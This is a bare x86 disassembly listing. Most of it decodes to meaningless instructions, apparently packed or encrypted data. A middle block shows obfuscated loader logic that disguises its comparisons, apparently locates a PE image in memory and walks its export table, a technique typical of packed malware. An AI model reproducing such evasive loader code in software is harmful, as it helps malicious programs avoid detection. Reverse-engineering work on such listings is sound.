  40e244:	dec    edx
  40e245:	fbstp  TBYTE PTR [edx]
  40e247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e248:	dec    edi
  40e249:	pop    esp
  40e24a:	sbb    BYTE PTR [ebx],ah
  40e24c:	ss aad 0x96
  40e24f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e250:	or     BYTE PTR [ecx+eax*2+0x53],0xb4
  40e255:	(bad)  
  40e256:	mov    cl,0x72
  40e258:	pop    es
  40e259:	jbe    0x40e275
  40e25b:	jmp    0x32de97f5
  40e260:	ins    DWORD PTR es:[edi],dx
  40e261:	dec    esi
  40e262:	push   esi
  40e263:	test   BYTE PTR [eax+eiz*4-0x727729b],bh
  40e26a:	(bad)  
  40e26b:	mul    BYTE PTR [edi+edx*4]
  40e26e:	js     0x40e227
  40e270:	retf   
  40e271:	ss ds adc al,0xb5
  40e275:	mov    bl,0x98
  40e277:	gs (bad) 
  40e279:	lock jnp 0x40e225
  40e27c:	(bad)  
  40e27d:	in     al,dx
  40e27e:	inc    edx
  40e27f:	out    dx,al
  40e280:	adc    al,0x21
  40e282:	xor    eax,DWORD PTR [esi]
  40e284:	idiv   DWORD PTR [ebp-0x1d]
  40e287:	(bad)  [ebx]
  40e289:	imul   ebx,ecx,0xffffffd0
  40e28c:	xchg   edx,eax
  40e28d:	adc    al,0xd5
  40e28f:	lods   eax,DWORD PTR ds:[esi]
  40e290:	int3   
  40e291:	call   FWORD PTR ds:0x7401210f
  40e297:	int3   
  40e298:	jnp    0x40e2e1
  40e29a:	or     eax,0xc3e85598
  40e29f:	push   ebx
  40e2a0:	les    eax,FWORD PTR [ebp+0x25]
  40e2a3:	or     DWORD PTR ds:0x3a56393f,ebp
  40e2a9:	mov    al,ds:0xf5032647
  40e2ae:	inc    ebx
  40e2af:	pop    ecx
  40e2b0:	adc    ecx,ebx
  40e2b2:	xchg   ecx,eax
  40e2b3:	pop    eax
  40e2b4:	mov    ?,WORD PTR [esi]
  40e2b6:	psraw  mm5,QWORD PTR [ecx+0x775044c0]
  40e2bd:	sahf   
  40e2be:	mov    edx,0x5ff9091b
  40e2c3:	or     esi,DWORD PTR [ebx+eax*2]
  40e2c6:	retf   0x7aee
  40e2c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2ca:	jo     0x40e2b9
  40e2cc:	test   BYTE PTR [eax-0x4a],bh
  40e2cf:	in     eax,dx
  40e2d0:	sar    DWORD PTR [ecx],1
  40e2d2:	sbb    eax,0x3ae4fa7b
  40e2d7:	sbb    eax,0xf510067a
  40e2dc:	jb     0x40e34c
  40e2de:	mov    ebx,0x433a88d
  40e2e3:	imul   ebp,DWORD PTR [edi+ebx*4-0x28bcb999],0x59e445f7
  40e2ee:	inc    ecx
  40e2ef:	xchg   ecx,eax
  40e2f0:	in     al,0x11
  40e2f2:	sub    eax,DWORD PTR [ebp+0x1589d029]
  40e2f8:	xchg   esi,eax
  40e2f9:	push   ecx
  40e2fa:	stc    
  40e2fb:	jg     0x40e2cb
  40e2fd:	cmp    DWORD PTR [esi],ebx
  40e2ff:	pop    eax
  40e300:	dec    esp
  40e301:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e302:	sub    al,0xf6
  40e304:	pop    esi
  40e305:	mov    ecx,0x2037796a
  40e30a:	jno    0x40e2ba
  40e30c:	add    ebp,DWORD PTR [edi]
  40e30e:	xlat   BYTE PTR ds:[ebx]
  40e30f:	pop    edi
  40e310:	outs   dx,DWORD PTR ds:[esi]
  40e311:	jmp    0x40e342
  40e313:	cmp    esi,edx
  40e315:	pushf  
  40e316:	daa    
  40e317:	fcomp  DWORD PTR [esp+esi*4-0xce165cc]
  40e31e:	jge    0x40e305
  40e320:	sbb    edx,ebp
  40e322:	imul   edx
  40e324:	dec    esp
  40e325:	int3   
  40e326:	sub    eax,0x23542b88
  40e32b:	rcl    BYTE PTR [ebp-0x3d],0x7f
  40e32f:	fild   QWORD PTR [eax]
  40e331:	add    cl,BYTE PTR [esp+ebp*1]
  40e334:	(bad)  
  40e335:	aaa    
  40e336:	add    edi,DWORD PTR [ecx]
  40e338:	out    0x1c,eax
  40e33a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e33b:	scas   eax,DWORD PTR es:[edi]
  40e33c:	int3   
  40e33d:	test   eax,0x43513af2
  40e342:	repnz dec eax
  40e344:	idiv   ebx
  40e346:	in     eax,dx
  40e347:	mov    ecx,0x72a17d82
  40e34c:	adc    eax,0x33dc6b99
  40e351:	retf   0x1bef
  40e354:	lea    eax,[esi-0x74]
  40e357:	and    DWORD PTR [eax+0x76ee9112],ecx
  40e35d:	pop    ss
  40e35e:	rcr    BYTE PTR [ebp+0x48],1
  40e361:	mov    esi,0xba9a8043
  40e366:	mov    edx,0x934268fe
  40e36b:	pop    ds
  40e36c:	pusha  
  40e36d:	cmp    cl,BYTE PTR [eax+0x66]
  40e370:	xchg   esi,eax
  40e371:	xchg   esp,eax
  40e372:	inc    esp
  40e373:	retf   0xb03c
  40e376:	pop    edi
  40e377:	or     ecx,DWORD PTR [ebx]
  40e379:	mov    edi,0xfc203c3
  40e37e:	scas   eax,DWORD PTR es:[edi]
  40e37f:	push   es
  40e380:	or     esi,0x11ff
  40e386:	mov    esi,DWORD PTR [ebp+0x8]
  40e389:	or     DWORD PTR ds:0x420e7e,0x420fac
  40e393:	xor    esi,ecx
  40e395:	and    DWORD PTR ds:0x420e7a,0x420f6c
  40e39f:	add    esi,edx
  40e3a1:	mov    DWORD PTR ds:0x420f04,0x5e6d
  40e3ab:	cmp    esi,eax
  40e3ad:	mov    eax,0x6dd0
  40e3b2:	mov    eax,DWORD PTR [ebp-0x4]
  40e3b5:	push   ebx
  40e3b6:	mov    DWORD PTR ds:0x420efc,0x12bd
  40e3c0:	je     0x40e450
  40e3c6:	and    DWORD PTR ds:0x420e92,0x0
  40e3d0:	jmp    0x40e3e2
  40e3d5:	mov    esi,DWORD PTR ds:0x420e92
  40e3db:	inc    esi
  40e3dc:	mov    DWORD PTR ds:0x420e92,esi
  40e3e2:	cmp    DWORD PTR ds:0x420e92,0x1b
  40e3e9:	jae    0x40e407
  40e3ef:	cmp    DWORD PTR ds:0x420e92,0x23
  40e3f6:	jne    0x40e402
  40e3fc:	call   DWORD PTR ds:0x424811
  40e402:	jmp    0x40e3d5
  40e407:	mov    esi,DWORD PTR [ebp-0x18]
  40e40a:	add    DWORD PTR [eax],esi
  40e40c:	add    eax,esi
  40e40e:	mov    eax,DWORD PTR [ebp-0x4]
  40e411:	sub    esi,DWORD PTR ds:0x420fb0
  40e417:	mov    esi,DWORD PTR [ebp+0xc]
  40e41a:	xor    DWORD PTR ds:0x420efc,0x420e8e
  40e424:	xor    esi,ecx
  40e426:	add    esi,edx
  40e428:	sbb    DWORD PTR ds:0x420ef8,0x67e3
  40e432:	imul   esi,DWORD PTR [eax]
  40e435:	mov    DWORD PTR ds:0x420f00,0x5d4a
  40e43f:	mov    DWORD PTR [eax],esi
  40e441:	mov    DWORD PTR ds:0x420efc,0x3930
  40e44b:	jmp    0x40e4ec
  40e450:	mov    esi,DWORD PTR [ebp+0x14]
  40e453:	and    DWORD PTR ds:0x420f68,0x0
  40e45d:	mov    ebx,DWORD PTR ds:0x420f68
  40e463:	inc    ebx
  40e464:	mov    DWORD PTR ds:0x420f68,ebx
  40e46a:	cmp    DWORD PTR ds:0x420f68,0x21
  40e471:	jne    0x40e482
  40e477:	push   0x420f08
  40e47c:	call   DWORD PTR ds:0x424815
  40e482:	cmp    DWORD PTR ds:0x420f68,0x19
  40e489:	jb     0x40e45d
  40e48f:	and    DWORD PTR ds:0x42201c,0x0
  40e499:	mov    edi,DWORD PTR ds:0x42201c
  40e49f:	inc    edi
  40e4a0:	mov    DWORD PTR ds:0x42201c,edi
  40e4a6:	cmp    DWORD PTR ds:0x42201c,0xd
  40e4ad:	jne    0x40e4c3
  40e4b3:	push   0x5b5d
  40e4b8:	push   0x5762
  40e4bd:	call   DWORD PTR ds:0x4247d5
  40e4c3:	cmp    DWORD PTR ds:0x42201c,0xc
  40e4ca:	jne    0x40e4dd
  40e4d0:	mov    edi,DWORD PTR ds:0x42201c
  40e4d6:	inc    edi
  40e4d7:	mov    DWORD PTR ds:0x42201c,edi
  40e4dd:	cmp    DWORD PTR ds:0x42201c,0x16
  40e4e4:	jb     0x40e499
  40e4ea:	xor    DWORD PTR [eax],esi
  40e4ec:	adc    ebx,DWORD PTR ds:0x420f58
  40e4f2:	mov    eax,DWORD PTR [ebp-0x4]
  40e4f5:	mov    edi,DWORD PTR [ebp+0x10]
  40e4f8:	mov    ebx,DWORD PTR ds:0x420ebe
  40e4fe:	mov    esi,DWORD PTR ds:0x420f80
  40e504:	sub    ebx,esi
  40e506:	add    ebx,DWORD PTR [ebx+esi*1]
  40e509:	xor    edi,ecx
  40e50b:	mov    ebx,DWORD PTR ds:0x420fb0
  40e511:	add    DWORD PTR ds:0x420efc,ebx
  40e517:	mov    esi,0xffcd8d23
  40e51c:	inc    ebx
  40e51d:	mov    ebx,esi
  40e51f:	sub    ebx,edi
  40e521:	add    DWORD PTR [eax],ebx
  40e523:	adc    edi,0x4f91
  40e529:	mov    eax,DWORD PTR [ebp-0x4]
  40e52c:	mov    edi,DWORD PTR [ebp-0x8]
  40e52f:	xor    DWORD PTR ds:0x420e8e,0x422014
  40e539:	add    edi,DWORD PTR [eax]
  40e53b:	mov    DWORD PTR [ebp-0x8],edi
  40e53e:	mov    eax,DWORD PTR [ebp+0xc]
  40e541:	mov    edi,DWORD PTR [ebp+0xc]
  40e544:	xor    edi,ecx
  40e546:	xor    eax,ecx
  40e548:	lea    eax,[eax+edi*1+0x64e5ba]
  40e54f:	mov    edi,DWORD PTR [ebp+0xc]
  40e552:	xor    edi,ecx
  40e554:	add    edi,edx
  40e556:	imul   eax,edi
  40e559:	mov    edi,DWORD PTR [ebp+0xc]
  40e55c:	xor    edi,ecx
  40e55e:	sub    edi,eax
  40e560:	mov    eax,DWORD PTR [ebp-0x4]
  40e563:	add    edi,edx
  40e565:	cmp    DWORD PTR [eax],edi
  40e567:	mov    eax,DWORD PTR [ebp-0x4]
  40e56a:	mov    edi,DWORD PTR [ebp+0x10]
  40e56d:	jg     0x40e580
  40e573:	xor    edi,ecx
  40e575:	mov    ebx,esi
  40e577:	sub    ebx,edi
  40e579:	add    DWORD PTR [eax],ebx
  40e57b:	jmp    0x40e586
  40e580:	xor    edi,ecx
  40e582:	add    edi,edx
  40e584:	add    DWORD PTR [eax],edi
  40e586:	mov    eax,DWORD PTR [ebp-0x8]
  40e589:	mov    edi,DWORD PTR [ebp-0x10]
  40e58c:	mov    eax,DWORD PTR [eax]
  40e58e:	xor    edi,ecx
  40e590:	add    edi,0x3272dc
  40e596:	not    edi
  40e598:	and    eax,edi
  40e59a:	movsx  di,BYTE PTR [eax+0x1]
  40e59f:	mov    ebx,0x3b4c
  40e5a4:	sub    di,bx
  40e5a7:	mov    ebx,0x8a89
  40e5ac:	xor    di,bx
  40e5af:	mov    ebx,0x4f87
  40e5b4:	cmp    di,bx
  40e5b7:	jne    0x40e5df
  40e5bd:	movsx  di,BYTE PTR [eax]
  40e5c1:	mov    ebx,0x3b4c
  40e5c6:	sub    di,bx
  40e5c9:	mov    ebx,0x8a89
  40e5ce:	xor    di,bx
  40e5d1:	mov    ebx,0x4f88
  40e5d6:	cmp    di,bx
  40e5d9:	je     0x40e5ef
  40e5df:	mov    edi,DWORD PTR [ebp-0x10]
  40e5e2:	xor    edi,ecx
  40e5e4:	mov    ebx,esi
  40e5e6:	sub    ebx,edi
  40e5e8:	add    eax,ebx
  40e5ea:	jmp    0x40e59a
  40e5ef:	mov    esi,DWORD PTR [ebp-0x14]
  40e5f2:	mov    esi,DWORD PTR [esi]
  40e5f4:	mov    edi,DWORD PTR [eax+0x3c]
  40e5f7:	lea    esi,[edi+esi*8+0x78]
  40e5fb:	mov    esi,DWORD PTR [esi+eax*1]
  40e5fe:	mov    DWORD PTR [ebp-0x8],esi
  40e601:	mov    esi,DWORD PTR [ebp+0x8]
  40e604:	xor    esi,ecx
  40e606:	add    esi,edx
  40e608:	mov    DWORD PTR [ebp-0x14],esi
  40e60b:	mov    esi,DWORD PTR [ebp+0x8]
  40e60e:	mov    edi,DWORD PTR [ebp-0x8]
  40e611:	xor    esi,ecx
  40e613:	add    esi,edx
  40e615:	pop    ebx
  40e616:	cmp    edi,esi
  40e618:	jne    0x40e636
  40e61e:	mov    eax,DWORD PTR [ebp+0xc]
  40e621:	xor    eax,ecx
  40e623:	mov    ecx,DWORD PTR [ebp-0x8]
  40e626:	add    eax,edx
  40e628:	imul   eax,ecx
  40e62b:	mov    DWORD PTR [ebp-0x8],eax
  40e62e:	push   DWORD PTR [ebp+0x18]
  40e631:	jmp    0x410a04
  40e636:	mov    ecx,DWORD PTR [ebp-0x8]
  40e639:	add    ecx,eax
  40e63b:	mov    DWORD PTR [ebp-0x14],ecx
  40e63e:	mov    ecx,DWORD PTR [ebp-0x14]
  40e641:	mov    ecx,DWORD PTR [ecx+0xc]
  40e644:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e649:	mov    edx,0x3b4c
  40e64e:	sub    cx,dx
  40e651:	mov    edx,0x8a89
  40e656:	xor    cx,dx
  40e659:	mov    edx,0x4e76
  40e65e:	jmp    0x4109d8
  40e663:	stc    
  40e664:	add    BYTE PTR [edx+ebp*1],bh
  40e667:	pop    ss
  40e668:	push   cs
  40e669:	sti    
  40e66a:	or     ebx,DWORD PTR [ebx]
  40e66c:	mov    edx,0x79fd5ef2
  40e671:	jne    0x40e65d
  40e673:	jae    0x40e63f
  40e675:	jp     0x40e6f1
  40e677:	sbb    DWORD PTR [edi+0x7a],ebx
  40e67a:	jp     0x40e666
  40e67c:	pop    esp
  40e67d:	sbb    esp,DWORD PTR [esi+ecx*8]
  40e680:	sub    dl,dh
  40e682:	call   0x5e83:0x7a4b2204
  40e689:	aad    0xbf
  40e68b:	ja     0x40e6ab
  40e68d:	outs   dx,BYTE PTR ds:[esi]
  40e68e:	dec    edx
  40e68f:	jmp    0x4808:0xff1e07e5
  40e696:	pop    es
  40e697:	rcr    BYTE PTR [ebx+0x21],0x78
  40e69b:	ja     0x40e6c4
  40e69d:	sub    al,0xc5
  40e69f:	mov    edi,edx
  40e6a1:	scas   eax,DWORD PTR es:[edi]
  40e6a2:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40e6a4:	mov    DWORD PTR [esi],ebp
  40e6a6:	mov    esi,0xd34c9401
  40e6ab:	pop    eax
  40e6ac:	and    eax,esi
  40e6ae:	sti    
  40e6af:	cmp    DWORD PTR [eax+0x3b169898],ecx
  40e6b5:	xchg   DWORD PTR [esi+ebx*4],ebp
  40e6b8:	fdiv   DWORD PTR [ebp+0x22bddf49]
  40e6be:	lods   al,BYTE PTR ds:[esi]
  40e6bf:	push   esp
  40e6c0:	lock pusha 
  40e6c2:	mov    ch,0x7f
  40e6c4:	loope  0x40e64b
  40e6c6:	xor    esi,DWORD PTR [edi-0x4a]
  40e6c9:	(bad)  
  40e6ca:	fdivr  QWORD PTR [ebx+0x61997c89]
  40e6d0:	cmp    eax,0x4a99ee7
  40e6d5:	inc    eax
  40e6d6:	mov    bh,0xf
  40e6d8:	bound  ebp,QWORD PTR [ebp-0x40]
  40e6db:	mov    ds:0x5d645314,al
  40e6e0:	mov    ecx,0x61d781cb
  40e6e5:	jmp    0xea0a:0xa373a85a
  40e6ec:	pop    ds
  40e6ed:	(bad)  
  40e6ee:	cli    
  40e6ef:	jl     0x40e75a
  40e6f1:	xor    BYTE PTR [edx],bh
  40e6f3:	and    esp,edi
  40e6f5:	fstp   QWORD PTR [edi-0x4a05296b]
  40e6fb:	or     ebx,DWORD PTR [ecx+0x21f51906]
  40e701:	sbb    al,BYTE PTR [edi+ebp*2]
  40e704:	jo     0x40e70e
  40e706:	icebp  
  40e707:	add    dh,BYTE PTR [ecx]
  40e709:	loop   0x40e742
  40e70b:	cmp    BYTE PTR ds:0x3a495ea7,bh
  40e711:	jl     0x40e77f
  40e713:	retf   
  40e714:	shl    al,1
  40e716:	retf   
  40e717:	shr    BYTE PTR [ebp-0x2892eb7b],cl
  40e71d:	xor    DWORD PTR [esi+ebp*2-0x7],0xcd43f1ff
  40e725:	fld    TBYTE PTR [ecx+0x5]
  40e728:	fistp  QWORD PTR [esp+ebp*1-0x5f5adf09]
  40e72f:	cwde   
  40e730:	es inc eax
  40e732:	out    dx,eax
  40e733:	adc    BYTE PTR [esi+ebx*1],0xbd
  40e737:	scas   al,BYTE PTR es:[edi]
  40e738:	mov    esi,0x9e21e37d
  40e73d:	js     0x40e7b8
  40e73f:	daa    
  40e740:	sbb    ah,dh
  40e742:	lock call FWORD PTR [esi]
  40e745:	shl    DWORD PTR [esp+ebp*2+0x3d712e84],1
  40e74c:	xchg   edx,eax
  40e74d:	loopne 0x40e7c8
  40e74f:	xor    eax,0x31b51410
  40e754:	cmp    bl,dh
  40e756:	mov    bh,0x17
  40e758:	outs   dx,DWORD PTR ds:[esi]
  40e759:	pop    ebp
  40e75a:	push   ecx
  40e75b:	mov    eax,0x510ff2c7
  40e760:	sub    eax,0x9ceda3e8
  40e765:	or     DWORD PTR [ebx+edi*8],eax
  40e768:	pop    edi
  40e769:	rol    BYTE PTR [eax-0xc],0x36
  40e76d:	push   cs
  40e76e:	and    ah,0x4f
  40e771:	(bad)  
  40e772:	xchg   ecx,eax
  40e773:	sar    BYTE PTR [edi+0x74],0xd7
  40e777:	push   edx
  40e778:	outs   dx,DWORD PTR ds:[esi]
  40e779:	lahf   
  40e77a:	and    DWORD PTR [edi-0x41e69f1e],ebx
  40e780:	add    al,0x47
  40e782:	aad    0x4f
  40e784:	jle    0x40e77f
  40e786:	add    eax,0xf5aeba8f
  40e78b:	xchg   edx,eax
  40e78c:	inc    esi
  40e78d:	xor    DWORD PTR [esi-0x6b9c1ad7],ebp
  40e793:	add    dh,BYTE PTR [eax]
  40e795:	jae    0x40e7d4
  40e797:	xlat   BYTE PTR ds:[ebx]
  40e798:	dec    ebx
  40e799:	sbb    bh,dh
  40e79b:	jmp    0xcf42b56b
  40e7a0:	test   DWORD PTR [ecx+0x2bf7d438],ecx
  40e7a6:	mov    eax,gs
  40e7a8:	mov    esp,DWORD PTR ds:0xf82ecdde
  40e7ae:	dec    ebx
  40e7af:	push   esi
  40e7b0:	push   cs
  40e7b1:	sbb    edx,DWORD PTR [edx]
  40e7b3:	pop    es
  40e7b4:	enter  0xc1af,0x86
  40e7b8:	fisttp WORD PTR [ecx-0x5b]
  40e7bb:	inc    eax
  40e7bc:	dec    esp
  40e7bd:	push   cs
  40e7be:	jge    0x40e82f
  40e7c0:	xchg   edx,eax
  40e7c1:	inc    edi
  40e7c2:	sub    ebx,esp
  40e7c4:	dec    esi
  40e7c5:	mov    edi,?
  40e7c7:	hlt    
  40e7c8:	repnz adc al,0x7a
  40e7cb:	inc    esp
  40e7cc:	ja     0x40e761
  40e7ce:	gs jo  0x40e78a
  40e7d1:	or     eax,ebp
  40e7d3:	dec    edx
  40e7d4:	stc    
  40e7d5:	das    
  40e7d6:	xchg   edi,eax
  40e7d7:	cdq    
  40e7d8:	mov    dh,0x9d
  40e7da:	popf   
  40e7db:	popa   
  40e7dc:	dec    ecx
  40e7dd:	jns    0x40e7b1
  40e7df:	dec    edx
  40e7e0:	xchg   edi,eax
  40e7e1:	mov    WORD PTR [eax-0xc],fs
  40e7e4:	repnz daa 
  40e7e6:	outs   dx,BYTE PTR ds:[esi]
  40e7e7:	out    0x80,eax
  40e7e9:	std    
  40e7ea:	mov    bl,0x2b
  40e7ec:	(bad)  
  40e7ed:	out    dx,al
  40e7ee:	mov    edi,0xc8bb5444
  40e7f3:	push   ds
  40e7f4:	mov    fs,esi
  40e7f6:	ja     0x40e7e2
  40e7f8:	or     eax,0xad042fa4
  40e7fd:	fistp  DWORD PTR [ebp+0x546abef9]
  40e803:	retf   
  40e804:	sbb    ch,dh
  40e806:	int3   
  40e807:	and    ecx,ebp
  40e809:	and    BYTE PTR [edi+0x64418364],al
  40e80f:	jns    0x40e854
  40e811:	jp     0x40e841
  40e813:	aaa    
  40e814:	mov    ecx,0x2681eb43
  40e819:	mov    dh,0x5b
  40e81b:	mov    eax,0xc41024f2
  40e820:	in     eax,0x8e
  40e822:	stos   BYTE PTR es:[edi],al
  40e823:	jo     0x40e7fc
  40e825:	mov    BYTE PTR [ebx+0x15d2ca0f],ah
  40e82b:	jno    0x40e815
  40e82d:	ss pushf 
  40e82f:	(bad)  
  40e831:	mov    ebx,ecx
  40e833:	sbb    al,0xbb
  40e835:	pop    edi
  40e836:	out    dx,al
  40e837:	retf   0xe33e
  40e83a:	shr    DWORD PTR [ebx],cl
  40e83c:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40e83e:	(bad)  
  40e840:	push   0xffffff90
  40e842:	push   esi
  40e843:	hlt    
  40e844:	aam    0xb
  40e846:	dec    ebx
  40e847:	push   es
  40e848:	add    eax,0x2be75947
  40e84d:	cmp    ecx,esp
  40e84f:	cmp    ebp,DWORD PTR [eax-0x5ce3d84b]
  40e855:	imul   ebx,DWORD PTR [ebx-0x56d781ad],0xffffff9d
  40e85c:	fs push 0x40
  40e85f:	lods   al,BYTE PTR ds:[esi]
  40e860:	sbb    al,0x44
  40e862:	pop    ebx
  40e863:	jl     0x40e88b
  40e865:	or     ecx,DWORD PTR [ebx+0x520c0a3e]
  40e86b:	cli    
  40e86c:	(bad)  
  40e86d:	inc    edx
  40e86e:	xchg   edx,eax
  40e86f:	pop    es
  40e870:	xor    BYTE PTR [edx+eiz*2],al
  40e873:	sar    BYTE PTR [ebp-0x2b],0x52
  40e877:	scas   al,BYTE PTR es:[edi]
  40e878:	mov    bl,0x30
  40e87a:	dec    ebp
  40e87b:	xor    ah,BYTE PTR [ecx-0x32]
  40e87e:	sbb    eax,esi
  40e880:	dec    esi
  40e881:	cld    
  40e882:	call   0xb21c2b89
  40e887:	inc    edi
  40e888:	xchg   esi,eax
  40e889:	lods   al,BYTE PTR ds:[esi]
  40e88a:	mov    fs,edx
  40e88c:	xchg   ebp,eax
  40e88d:	fs es pop ebx
  40e890:	in     al,0xde
  40e892:	push   0x3de24afa
  40e897:	push   esp
  40e898:	lds    eax,FWORD PTR [edx]
  40e89a:	pushf  
  40e89b:	retf   
  40e89c:	stos   BYTE PTR es:[edi],al
  40e89d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e89e:	adc    esp,ecx
  40e8a0:	bound  ebx,QWORD PTR [edi+0x5d82d17a]
  40e8a6:	test   eax,0x7313c748
  40e8ab:	push   edx
  40e8ac:	test   DWORD PTR [edi+0x11],ecx
  40e8af:	fisttp WORD PTR [ebp+0x73]
  40e8b2:	xor    al,0xd
  40e8b4:	mov    bl,BYTE PTR [ebx-0x6790ce3e]
  40e8ba:	in     eax,dx
  40e8bb:	pop    ss
  40e8bc:	inc    esp
  40e8bd:	int3   
  40e8be:	out    dx,eax
  40e8bf:	lds    edi,FWORD PTR [esp+eax*4+0x467dcae6]
  40e8c6:	(bad)  
  40e8c7:	popa   
  40e8c8:	je     0x40e8c8
  40e8ca:	xor    BYTE PTR [ecx],ch
  40e8cc:	mov    DWORD PTR [edi],ebx
  40e8ce:	sub    BYTE PTR [edi],dh
  40e8d0:	mov    ah,BYTE PTR [ecx]
  40e8d2:	push   ebx
  40e8d3:	stc    
  40e8d4:	ins    DWORD PTR es:[edi],dx
  40e8d5:	cld    
  40e8d6:	push   DWORD PTR [ebx+0x729be832]
  40e8dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8dd:	jbe    0x40e93b
  40e8df:	pop    ds
  40e8e0:	int    0xd
  40e8e2:	not    esp
  40e8e4:	cmp    BYTE PTR [edx+0x487da955],al
  40e8ea:	test   eax,0x81be0263
  40e8ef:	test   BYTE PTR [edx],cl
  40e8f1:	(bad)  
  40e8f2:	gs pop ss
  40e8f4:	(bad)  
  40e8f5:	repnz and ah,BYTE PTR [ebp+esi*2-0x284f0f25]
  40e8fd:	xchg   ecx,eax
  40e8fe:	mov    eax,0xbf8b6b9f
  40e903:	sbb    DWORD PTR [esi],edi
  40e905:	or     al,0xa3
  40e907:	mov    edx,DWORD PTR [edi+0x44704b49]
  40e90d:	outs   dx,DWORD PTR ds:[esi]
  40e90e:	jb     0x40e964
  40e910:	lahf   
  40e911:	dec    ebx
  40e912:	loopne 0x40e961
  40e914:	scas   eax,DWORD PTR es:[edi]
  40e915:	sbb    eax,0x3265caa5
  40e91a:	pop    eax
  40e91b:	or     bl,BYTE PTR [edi+0x6b078ac4]
  40e921:	adc    eax,0xc07cc2c6
  40e926:	bound  esi,QWORD PTR [edx+0x7181b777]
  40e92c:	mov    al,ds:0xcd539552
  40e931:	pusha  
  40e932:	out    0x98,eax
  40e934:	div    DWORD PTR [edi+0xf]
  40e937:	xlat   BYTE PTR ds:[ebx]
  40e938:	and    eax,0xc68b7a7e
  40e93d:	jmp    0x245cf33
  40e942:	jmp    0xbc6:0xdde2af86
  40e949:	jo     0x40e9c8
  40e94b:	dec    esp
  40e94c:	cld    
  40e94d:	add    edx,DWORD PTR [ebx+0x65deb80d]
  40e953:	cdq    
  40e954:	mov    DWORD PTR [eax+0x5bb8aff7],edi
  40e95a:	inc    esp
  40e95b:	imul   ebp,DWORD PTR [ecx+0x1f],0x9ad77b92
  40e962:	or     BYTE PTR [esi-0x35c543f7],al
  40e968:	sbb    ecx,eax
  40e96a:	or     bh,BYTE PTR [bp+si+0x3e10]
  40e96f:	xchg   dh,ch
  40e971:	lock add BYTE PTR [edi+0x6ca30b39],dh
  40e978:	fs mov esp,0xb5242b7b
  40e97e:	repz daa 
  40e980:	inc    edx
  40e981:	sbb    ch,BYTE PTR [esi]
  40e983:	mov    dh,BYTE PTR [ebp-0x2b]
  40e986:	cld    
  40e987:	adc    ah,BYTE PTR [eax+0x3f]
  40e98a:	inc    edi
  40e98b:	pushf  
  40e98c:	sub    eax,0x548ee
  40e991:	loope  0x40e9b3
  40e993:	jnp    0x40e919
  40e995:	lahf   
  40e996:	fcom   DWORD PTR [ecx+0x3ec4f2d]
  40e99c:	ins    DWORD PTR es:[edi],dx
  40e99d:	add    ebp,ebp
  40e99f:	outs   dx,DWORD PTR ds:[esi]
  40e9a0:	cmp    DWORD PTR [ebx],ebp
  40e9a2:	aad    0xc2
  40e9a4:	jp     0x40e984
  40e9a6:	mov    ebp,0xe52184f
  40e9ab:	add    ebp,ebx
  40e9ad:	mov    dl,0x85
  40e9af:	sbb    edx,DWORD PTR [edi-0x27]
  40e9b2:	pop    edx
  40e9b3:	in     al,dx
  40e9b4:	gs jb  0x40e94a
  40e9b7:	sbb    ah,BYTE PTR [ecx+ebx*8]
  40e9ba:	pop    esi
  40e9bb:	push   esi
  40e9bc:	mov    ecx,0x58bd6318
  40e9c1:	out    0x99,al
  40e9c3:	dec    ebp
  40e9c4:	adc    eax,0x8209a3e4
  40e9c9:	pop    ebp
  40e9ca:	sbb    DWORD PTR [eax-0x23],0xffffffb8
  40e9ce:	mov    al,ds:0x4893f4d5
  40e9d3:	xchg   esp,eax
  40e9d4:	and    BYTE PTR [ecx-0xd],0xe7
  40e9d8:	cmp    DWORD PTR [eax+edi*1-0x2761d021],esi
  40e9df:	loop   0x40ea0d
  40e9e1:	stos   DWORD PTR es:[edi],eax
  40e9e2:	mov    dl,0x42
  40e9e4:	inc    ecx
  40e9e5:	repz mov ebx,0x3f9f9343
  40e9eb:	imul   esp,DWORD PTR [esi-0x51beec08],0x35
  40e9f2:	and    ebx,edx
  40e9f4:	cs xchg esp,eax
  40e9f6:	fisttp WORD PTR [esi-0x678cbba9]
  40e9fc:	sbb    DWORD PTR [edi],0x3ff422cb
  40ea02:	or     ebp,DWORD PTR [edi-0x757f263d]
  40ea08:	inc    edi
  40ea09:	outs   dx,BYTE PTR ds:[esi]
  40ea0a:	sbb    DWORD PTR [ebx+0x4d],ebp
  40ea0d:	sbb    eax,0xa1ede913
  40ea12:	aam    0xcc
  40ea14:	int3   
  40ea15:	adc    esi,edx
  40ea17:	shr    bl,cl
  40ea19:	mov    ds:0xd96c85a9,eax
  40ea1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea1f:	pop    esi
  40ea20:	mov    eax,DWORD PTR [esi+0x496eab41]
  40ea26:	fcom   DWORD PTR [ecx+ebx*1+0xa3a9453]
  40ea2d:	scas   eax,DWORD PTR es:[edi]
  40ea2e:	lds    esi,FWORD PTR [esp+eax*4+0x6079bae7]
  40ea35:	outs   dx,BYTE PTR ds:[esi]
  40ea36:	int3   
  40ea37:	sub    BYTE PTR [edx],dh
  40ea39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea3a:	push   esp
  40ea3c:	sbb    BYTE PTR [eax+0x79],bl
  40ea3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea40:	das    
  40ea41:	std    
  40ea42:	inc    esi
  40ea43:	push   edx
  40ea44:	call   DWORD PTR ss:[edi-0x6c635c87]
  40ea4b:	call   0xe0a0:0xbe38d168
  40ea52:	fbstp  TBYTE PTR [ecx+esi*8+0x367bb361]
  40ea59:	sub    DWORD PTR [edi-0x6a],edx
  40ea5c:	add    edx,DWORD PTR [eax]
  40ea5e:	push   ecx
  40ea5f:	cmp    BYTE PTR [eax+0x7a],bh
  40ea62:	fwait
  40ea63:	pop    esp
  40ea64:	popa   
  40ea65:	adc    ebp,DWORD PTR [ebx-0x9d8a832]
  40ea6b:	jl     0x40ea1d
